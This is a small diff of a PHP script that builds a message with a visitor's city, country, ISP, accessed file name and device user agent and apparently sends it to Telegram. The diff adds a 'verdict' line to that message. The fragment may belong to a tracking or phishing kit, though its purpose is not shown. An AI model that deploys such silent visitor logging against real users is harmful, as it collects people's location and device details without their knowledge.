@@ -35,7 +35,8 @@ if (!@file_exists($key)) {
          . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
          . "\x{1F310} ISP: " . $g['isp'] . "\n"
          . "\x{1F4C1} File: " . $name . "\n"
-         . "\x{1F4F1} Device: " . ua();
+         . "\x{1F4F1} Device: " . ua()
+         . verdict_line($tok);
     tg($msg);
 }
 ?>
